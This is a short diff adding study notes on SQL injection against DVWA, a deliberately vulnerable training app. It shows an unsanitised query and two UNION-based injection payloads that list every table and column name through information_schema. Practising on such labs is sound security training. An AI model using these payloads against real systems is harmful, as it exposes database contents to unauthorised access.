@@ -1,0 +1,5 @@
+QUERY:
+	SELECT first_name, last_name FROM users WHERE user_id = '$id'
+Attacks:
+	All tables: 1' and 1=0 union select table_schema, table_name from information_schema.tables #
+	All columns in a table: 1' and 1=0 union select null, column_name from information_schema.columns WHERE  table_schema=DATABASE() AND table_name like 'dvwa' #
